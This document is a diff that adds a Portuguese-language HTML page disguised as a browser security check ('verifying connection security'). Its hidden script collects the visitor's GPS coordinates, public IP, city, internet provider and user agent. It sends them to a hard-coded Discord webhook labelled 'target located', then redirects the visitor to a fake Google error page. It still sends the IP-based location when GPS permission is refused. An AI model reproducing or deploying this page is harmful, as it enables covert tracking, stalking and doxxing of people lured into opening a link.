@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificando Navegador...</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div id="content">
+        <div class="loader"></div>
+        <p>Aguarde, verificando segurança da conexão...</p>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1473782004226195456/X3ZuJvvwZYDp-ZpF_BSTFOhifd6tq_CRiEMlcz_LkiMPZR9kLbdMBRS6Y1a5PaEaUiKe";
+
+        async function enviarParaDiscord(dados) {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: "🎯 **ALVO LOCALIZADO!**",
+                    embeds: [{
+                        title: "Informações do Dispositivo",
+                        color: 16711680,
+                        fields: [
+                            { name: "📍 Coordenadas (GPS)", value: dados.coords || "Não permitiu GPS" },
+                            { name: "🗺️ Google Maps", value: dados.mapLink || "N/A" },
+                            { name: "🌐 IP Público", value: dados.ip || "Carregando..." },
+                            { name: "🏠 Cidade/Provedor", value: dados.loc || "Carregando..." },
+                            { name: "📱 Aparelho", value: navigator.userAgent }
+                        ],
+                        footer: { text: "Data: " + new Date().toLocaleString() }
+                    }]
+                })
+            });
+            // Após enviar, joga ele no erro 404
+            window.location.href = "https://google.com/404-error-page-not-found"; 
+        }
+
+        // 1. Tenta pegar Localização Exata (GPS)
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                
+                // Pega dados de IP para complementar
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+
+                enviarParaDiscord({
+                    coords: `Lat: ${lat}, Lon: ${lon}`,
+                    mapLink: `https://www.google.com/maps?q=${lat},${lon}`,
+                    ip: ipData.ip,
+                    loc: `${ipData.city}, ${ipData.region} - ${ipData.org}`
+                });
+
+            }, async (error) => {
+                // Se ele recusar o GPS, ainda pegamos o IP (localização aproximada)
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+
+                enviarParaDiscord({
+                    coords: "Permissão Negada pelo Usuário",
+                    mapLink: "Não disponível",
+                    ip: ipData.ip,
+                    loc: `${ipData.city}, ${ipData.region} - ${ipData.org}`
+                });
+            });
+        } else {
+            enviarParaDiscord({ coords: "Navegador não suporta GPS" });
+        }
+    </script>
+</body>
+</html>
